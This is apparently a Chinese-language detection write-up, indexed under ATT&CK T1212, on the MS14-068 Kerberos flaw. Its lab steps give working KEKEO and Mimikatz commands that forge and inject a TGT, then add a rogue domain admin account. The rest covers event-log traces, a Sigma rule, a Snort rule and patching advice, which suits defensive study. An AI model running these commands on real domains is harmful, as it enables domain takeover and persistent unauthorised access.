# T1212-Win-MS14-068-KEKEO

## 描述

攻击者可能利用软件漏洞（如MS14-068，CVE-2014-6324）通过票据传递攻击（Pass-the-Ticket，PtT）窃取Kerberos凭据并提升权限。MS14-068针对WindowsKerberos协议，允许已认证的域用户伪造Kerberos票据授予票据（TGT），从而获得域管理员权限。KEKEO工具可用于生成和注入伪造票据，结合Mimikatz实现PtT攻击，绕过认证机制访问域内任意资源。攻击者可通过伪造白银票据访问特定服务（如SharePoint）或利用KRBTGT账户的NTLM哈希生成黄金票据，为域内任意账户创建TGT。

## 测试案例

**测试环境**：
- 域控制器：WindowsServer2008R2（未打补丁KB3011780）
- 域内主机：Windows7SP1（域成员）
- 工具：KEKEO、Mimikatz
- 要求：域用户凭据（用户名、密码）、用户SID、域控制器地址、时间同步（Kerberos要求客户端与DC时间差小于5分钟）

**测试准备**：
1. 确认域控制器未安装MS14-068补丁（KB3011780）。
2. 获取域用户凭据及用户SID（通过`whoami/user`）。
3. 确保域内主机与域控制器网络连通，时间同步（使用`nettime/set`）。
4. 下载KEKEO（<https://github.com/gentilkiwi/kekeo>）及Mimikatz，准备测试环境。

**测试步骤**：
1. 查询当前用户SID：
   ```cmd
   whoami/user
   ```
   示例输出：
   ```
   USERINFORMATION
   ----------------
   UserName         SID
   ================= =============================================
   lab\testuser      S-1-5-21-1473643419-774954089-2222329127-1110
   ```
2. 检查对域控制器C$共享的权限（通常无权限）：
   ```cmd
   dir\\dc.lab.local\C$
   ```
   预期输出：
   ```
   dir:Accessisdenied
   ```
3. 使用KEKEO生成伪造TGT：
   ```cmd
   kekeo.exe"tgs::ms14068/user:testuser@lab.local/password:Passw0rd123/sid:S-1-5-21-1473643419-774954089-2222329127-1110/dc:dc.lab.local"
   ```
   成功后生成`.kirbi`票据文件（如`TGT_testuser@lab.local.kirbi`）。
4. 使用Mimikatz注入票据：
   ```cmd
   mimikatz.exe
   kerberos::purge
   kerberos::list
   kerberos::pttTGT_testuser@lab.local.kirbi
   exit
   ```
5. 验证域管理员权限：
   ```cmd
   dir\\dc.lab.local\C$
   netusernewadminP@ssw0rd123/add/domain
   netgroup"DomainAdmins"newadmin/add/domain
   ```

**参考资源**：
- 内网渗透之PTH&PTT&PTK：<https://www.bbsmax.com/A/A7zgkjRPz4/>
- KEKEO工具：<https://github.com/gentilkiwi/kekeo>

## 检测日志

**数据来源**：
- **Windows安全日志**：域控制器上的事件ID4624（账户登录）、4672（特权分配）、4768（Kerberos认证请求）、4769（Kerberos服务票据请求）。
- **网络流量**：捕获Kerberos协议流量（端口88），关注AS-REQ和TGS-REQ中异常字段（如`include-pac:False`）。
- **Sysmon日志**（可选）：事件ID1（进程创建，监控KEKEO或Mimikatz）、事件ID3（网络连接，捕获与DC的Kerberos通信）。

**关键日志字段**：
- 事件ID4624：`AccountDomain`（异常域格式，如`LAB.LOCAL`而非`LAB`）、`AccountName`。
- 事件ID4672：`AccountDomain`（异常域格式）、`AssignedPrivileges`（如SeDebugPrivilege）。
- 事件ID4768/4769：`SuppliedRealmName`（异常域格式）、`TicketOptions`（伪造票据请求）。

## 测试复现

**环境配置**：
- 域控制器：WindowsServer2008R2（未打补丁）
- 域内主机：Windows7SP1
- 工具：KEKEO、Mimikatz
- 域用户：`testuser@lab.local`，密码`Passw0rd123`，SID`S-1-5-21-1473643419-774954089-2222329127-1110`
- 域控制器：`dc.lab.local`

**复现步骤**：
1. 在域内主机执行：
   ```cmd
   whoami/user
   dir\\dc.lab.local\C$
   kekeo.exe"tgs::ms14068/user:testuser@lab.local/password:Passw0rd123/sid:S-1-5-21-1473643419-774954089-2222329127-1110/dc:dc.lab.local"
   ```
   输出示例：
   ```
   [+]MS14-068exploitation:BuildingAS-REQfordc.lab.local...Done!
   [+]SendingAS-REQtodc.lab.local...Done!
   [+]ReceivingAS-REPfromdc.lab.local...Done!
   [+]BuildingTGS-REQfordc.lab.local...Done!
   [+]SendingTGS-REQtodc.lab.local...Done!
   [+]Creatingkirbifile'TGT_testuser@lab.local.kirbi'...Done!
   ```
2. 使用Mimikatz注入票据：
   ```cmd
   mimikatz.exe"kerberos::purge""kerberos::list""kerberos::pttTGT_testuser@lab.local.kirbi"exit
   ```
3. 验证权限提升：
   ```cmd
   dir\\dc.lab.local\C$
   netusernewadminP@ssw0rd123/add/domain
   netgroup"DomainAdmins"newadmin/add/domain
   ```

## 测试留痕

**Windows安全日志（域控制器）**：
- **事件ID4624**（账户登录）：
  ```xml
  <Event>
    <EventData>
      <DataName="TargetUserName">testuser</Data>
      <DataName="TargetDomainName">LAB.LOCAL</Data>
      <DataName="LogonType">3</Data>
      <DataName="AuthenticationPackageName">Kerberos</Data>
    </EventData>
  </Event>
  ```
- **事件ID4672**（特权分配）：
  ```xml
  <Event>
    <EventData>
      <DataName="TargetUserName">testuser</Data>
      <DataName="TargetDomainName">LAB.LOCAL</Data>
      <DataName="AssignedPrivileges">SeDebugPrivilege,SeTcbPrivilege</Data>
    </EventData>
  </Event>
  ```
- **事件ID4769**（Kerberos服务票据请求）：
  ```xml
  <Event>
    <EventData>
      <DataName="TargetUserName">testuser</Data>
      <DataName="TargetDomainName">LAB.LOCAL</Data>
      <DataName="ServiceName">krbtgt/LAB.LOCAL</Data>
      <DataName="TicketOptions">0x40810010</Data>
    </EventData>
  </Event>
  ```

**网络流量（WireShark）**：
- AS-REQ：`include-pac:False`（正常请求包含PAC）。
- TGS-REQ：伪造PAC，可能使用MD5校验。

## 检测规则/思路

### Sigma规则

```yaml
title:MS14-068KEKEOKerberosExploitationAttempt
id:9b7c8d3e-6f7a-4b4b-ac9d-3f4a5b6c7d8e
status:stable
description:DetectspotentialMS14-068exploitationattemptsusingKEKEOtoforgeKerberosticketsforprivilegeescalation
references:
  -https://attack.mitre.org/techniques/T1212/
  -https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf
  -https://adsecurity.org/?p=556
tags:
  -attack.privilege_escalation
  -attack.t1212
logsource:
  product:windows
  service:security
detection:
  selection_4624:
    EventID:4624
    LogonType:3
    AuthenticationPackageName:Kerberos
    TargetDomainName|contains:'.'
  selection_4672:
    EventID:4672
    TargetDomainName|contains:'.'
    AssignedPrivileges|contains:
      -SeDebugPrivilege
      -SeTcbPrivilege
  selection_4768:
    EventID:4768
    SuppliedRealmName|contains:'.'
  selection_4769:
    EventID:4769
    ServiceName|contains:'krbtgt'
    TargetDomainName|contains:'.'
  filter_normal:
    TargetUserName:
      -'ntp$'
      -'S-1-0-0'
  timeframe:5s
  condition:(selection_4624andselection_4672and(selection_4768orselection_4769))andnotfilter_normal
fields:
  -EventID
  -TargetUserName
  -TargetDomainName
  -LogonType
  -AuthenticationPackageName
  -AssignedPrivileges
  -SuppliedRealmName
  -ServiceName
falsepositives:
  -LegitimateKerberosauthenticationwithcomplexdomainnames
  -Administrativetoolsaccessingdomainresources
level:high
```

### 检测思路

1. **日志监控**：
   - 监控域控制器安全日志，关注事件ID4624、4672、4768、4769，检查`TargetDomainName`或`SuppliedRealmName`的异常点号（`.`）。
   - 检测事件ID4672中高权限分配（如SeDebugPrivilege）与非管理员用户结合。

2. **网络监控**：
   - 使用WireShark或IDS捕获Kerberos流量，检测AS-REQ中`include-pac:False`或TGS-REQ中使用MD5的异常票据。
   - 示例Snort规则：
     ```snort
     alertudpanyany->any88(msg:"MS14-068KEKEOExploitAttempt";content:"include-pac:False";sid:1000002;)
     ```

3. **行为分析**：
   - 检测低权限用户访问域控制器敏感资源（如C$共享）。
   - 监控KEKEO或Mimikatz进程执行及票据注入行为。

4. **补丁状态检查**：
   - 使用PowerShell检查域控制器是否安装KB3011780补丁：
     ```powershell
     Get-HotFix-IdKB3011780
     ```

## 防御建议

1. **及时打补丁**：
   - 为域控制器（WindowsServer2008/2008R2）安装KB3011780补丁，覆盖MS14-068漏洞。
   - 定期检查补丁状态，确保所有系统更新。

2. **强化日志配置**：
   - 启用Kerberos事件日志（事件ID4768/4769），记录成功和失败审计。
   - 部署Sysmon，监控进程创建（事件ID1）和网络连接（事件ID3）。

3. **限制域用户权限**：
   - 最小化域用户权限，限制普通用户访问域控制器资源。
   - 使用组策略禁用非管理员对C$共享的访问。

4. **网络监控**：
   - 部署IDS/IPS，检测Kerberos异常流量（如`include-pac:False`）。
   - 确保客户端与域控制器时间同步，防止票据伪造。

5. **主动防御**：
   - 部署诱捕账户（HoneyAccounts），监控异常高权限访问。
   - 使用EDR工具检测KEKEO、Mimikatz等工具的执行或票据注入行为。

## 参考推荐

- MITREATT&CK:ExploitationforCredentialAccess(T1212)  
  <https://attack.mitre.org/techniques/T1212/>
- 内网渗透之PTH&PTT&PTK  
  <https://www.bbsmax.com/A/A7zgkjRPz4/>
- KEKEO工具文档  
  <https://github.com/gentilkiwi/kekeo>
- ActiveDirectorySecurity:MS14-068ExploitAnalysis  
  <https://adsecurity.org/?p=556>
- MicrosoftSecurityBulletinMS14-068  
  <https://support.microsoft.com/kb/3011780>
